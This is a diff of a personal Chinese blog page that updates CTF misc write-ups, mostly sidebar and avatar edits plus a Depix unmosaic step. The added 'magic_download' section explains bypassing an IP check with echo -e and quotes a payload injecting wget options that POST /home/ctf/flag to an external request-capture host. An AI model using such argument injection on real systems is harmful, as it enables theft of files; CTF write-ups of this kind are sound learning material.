@@ -262,6 +262,11 @@ s1 = [0o146, 0o154, 0o141, 0o147, 0o173, 0o167, 0o63, 0o154, 0o143, 0o157, ..." 
     <div id="side-posttitle" style="display: none;">
         
     
+    CTFWshow DJBCTF大吉杯 misc 复现
+    <script>postsnum += 1</script>
+    
+    
+    
     *CTF misc 复现
     <script>postsnum += 1</script>
     
@@ -307,14 +312,7 @@ s1 = [0o146, 0o154, 0o141, 0o147, 0o173, 0o167, 0o63, 0o154, 0o143, 0o157, ..." 
     
     
     
-    
-    
     NCTF2020-misc wp
-    <script>postsnum += 1</script>
-    
-    
-    
-    炒粉如何避免粘锅
     <script>postsnum += 1</script>
     
     
@@ -406,7 +404,7 @@ s1 = [0o146, 0o154, 0o141, 0o147, 0o173, 0o167, 0o63, 0o154, 0o143, 0o157, ..." 
         <a onclick="showAaplayer()"><i style="font-size: 20px;"><img
                     src='http://ayanagi.fun/media/images/music.png' alt="音乐播放器" class="musicbtn"></i></a>
         <div class="avatar-border">
-            <img src="http://ayanagi.fun/images/avatar.png?v=1611504734346" class="avatar">
+            <img src="http://ayanagi.fun/images/avatar.png?v=1611569271212" class="avatar">
         </div>
         <div class="sitename">ハルカトオク</div>
         <span class="describtion" data-text='["又岂在朝朝暮暮。"]'>&nbsp;</span>
@@ -762,7 +760,7 @@ s1 = [0o146, 0o154, 0o141, 0o147, 0o173, 0o167, 0o63, 0o154, 0o143, 0o157, ..." 
                 <img src="' + talks[i].img + '" class="talkimg"> \
                 <div class="ainfo">\
                     <div class="ainfo-intro">\
-                        <img class="intro1" src="http://ayanagi.fun/images/avatar.png?v=1611504734346">\
+                        <img class="intro1" src="http://ayanagi.fun/images/avatar.png?v=1611569271212">\
                         <div class="author">' + talks[i].author + '</div>·\
                         <div class="time">' + talks[i].time + '</div>\
                     </div>\
@@ -775,7 +773,7 @@ s1 = [0o146, 0o154, 0o141, 0o147, 0o173, 0o167, 0o63, 0o154, 0o143, 0o157, ..." 
             <div class="talk" v-for="t in talks"> \
                 <div class="ainfo">\
                     <div class="ainfo-intro">\
-                        <img class="intro1" src="http://ayanagi.fun/images/avatar.png?v=1611504734346">\
+                        <img class="intro1" src="http://ayanagi.fun/images/avatar.png?v=1611569271212">\
                         <div class="author">' + talks[i].author + '</div>·\
                         <div class="time">' + talks[i].time + '</div>\
                     </div>\
@@ -1209,10 +1207,15 @@ os.system(&quot;ls /&quot;)
 将附件图片放进Depix文件夹下，在Depix文件夹里的images/searchimages里把debruinseq_notepad_Windows10_closeAndSpaced.png复制到Depix文件夹里，打开终端输入如下命令</p>
 <pre><code>python3 depix.py -p mosaic.png -s debruinseq_notepad_Windows10_closeAndSpaced.png
 </code></pre>
-<p>跑了一会儿得到output.png，其实这个时候我读了好久没读出来那个关键的地方是什么字母，遍历试了可能性交上去也是wa，就很难受，最后还是没出。看wp的时候拍断大腿。<br>
+<p>跑了一会儿得到output.png，当时我读了好久没读出来那个关键的地方是什么字母，遍历试了可能性交上去也是wa，就很难受，最后还是没出。看wp的时候拍断大腿。但是隐约记得我输过a还是错了(?)<br>
 <img src="http://ayanagi.fun/post-images/1611502957560.png" alt="" loading="lazy"></p>
 <h1 id="magic_download">magic_download</h1>
-<p>看不懂。</p>
+<p><code>run.sh</code>文件内容如下<img src="http://ayanagi.fun/post-images/1611552245410.png" alt="" loading="lazy"><br>
+代码的大意是读取你输入的ip，判断ip是否合法，合法后执行<code>./wget -P /tmp $IP</code>这条语句<br>
+使用的是echo语句，那么就可以用-e参数来实现转义并且构造命令输入，传入\n来绕过ip的判断<br>
+绕过后就可以传参到wget了<br>
+环境已经关了，别人的wp payload如下<br>
+<code>-e tries=20 --post-file=/home/ctf/flag http://http.requestbin.buuoj.cn/w9gw6tw9 \\n127.0.0.1</code></p>
 <h1 id="问卷调查">问卷调查</h1>
 <p>有手就行</p>
 
